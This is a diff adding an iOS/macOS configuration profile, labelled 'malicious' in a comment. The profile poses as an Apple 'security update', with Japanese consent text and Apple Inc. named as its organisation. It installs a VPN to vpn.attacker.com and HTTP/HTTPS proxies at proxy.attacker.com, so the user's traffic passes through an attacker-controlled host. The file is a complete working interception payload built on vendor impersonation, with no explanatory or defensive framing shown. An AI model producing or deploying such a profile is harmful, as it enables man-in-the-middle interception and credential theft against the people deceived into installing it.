@@ -1,0 +1,75 @@
+<!-- malicious.mobileconfig -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.vpn.managed</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.security.vpn</string>
+            <key>PayloadUUID</key>
+            <string>00000000-0000-0000-0000-000000000001</string>
+            <key>PayloadDisplayName</key>
+            <string>セキュリティVPN</string>
+            <key>UserDefinedName</key>
+            <string>セキュリティVPN</string>
+            <key>VPNType</key>
+            <string>IKEv2</string>
+            <key>RemoteAddress</key>
+            <string>vpn.attacker.com</string>
+            <key>AuthenticationMethod</key>
+            <string>SharedSecret</string>
+            <key>SharedSecret</key>
+            <string>sharedsecret123</string>
+            <key>LocalIdentifier</key>
+            <string>user</string>
+            <key>RemoteIdentifier</key>
+            <string>server</string>
+        </dict>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.proxy.managed</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.security.proxy</string>
+            <key>PayloadUUID</key>
+            <string>00000000-0000-0000-0000-000000000002</string>
+            <key>PayloadDisplayName</key>
+            <string>プロキシ設定</string>
+            <key>HTTPProxy</key>
+            <string>proxy.attacker.com</string>
+            <key>HTTPPort</key>
+            <integer>8080</integer>
+            <key>HTTPSProxy</key>
+            <string>proxy.attacker.com</string>
+            <key>HTTPSPort</key>
+            <integer>8080</integer>
+        </dict>
+    </array>
+    <key>PayloadDisplayName</key>
+    <string>セキュリティアップデート</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.update</string>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>00000000-0000-0000-0000-000000000003</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadDescription</key>
+    <string>デバイスのセキュリティを向上させるためのアップデート</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Inc.</string>
+    <key>ConsentText</key>
+    <dict>
+        <key>default</key>
+        <string>このプロファイルをインストールすると、デバイスのセキュリティ設定が更新されます。</string>
+    </dict>
+</dict>
+</plist>
